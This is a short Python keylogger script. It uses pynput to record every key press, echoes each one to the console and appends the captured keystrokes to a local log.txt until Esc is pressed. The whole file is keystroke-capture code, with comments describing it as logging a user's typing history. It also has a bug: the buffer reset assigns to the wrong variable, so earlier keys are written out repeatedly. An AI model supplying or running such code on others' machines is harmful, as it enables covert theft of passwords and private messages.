import pynput

from pynput.keyboard import Key, Listener

# these variables are useful for if the user hit the error or just break the system,
# then we can still have the log from the history of typing from user.
count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key) # put the key into the array
    count += 1
    print("[0] pressed."+format(key))#will be print all of format the key pressed

    # if the keys more than or equal to certain number below, then will be written to the file.
    if count >= 10:
        count = 0
        write_file(keys) #write keys into the file
        key = []


def write_file(keys):
    with open("log.txt", "a") as f: # "w" is for write if the log.txt has not created yet, if created, then change with "a"
        for key in keys:
            k = str(key).replace("'","") # will remove all the single quotes when the keys has been saved into log
            if k.find("space") > 0: # if there is space pressed in the log file, then will be enter
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False

# this lister is a function for the keyboard when on press and release
with Listener(on_press=on_press, on_release=on_release) as listner:
    listner.join() #will be looped until we break in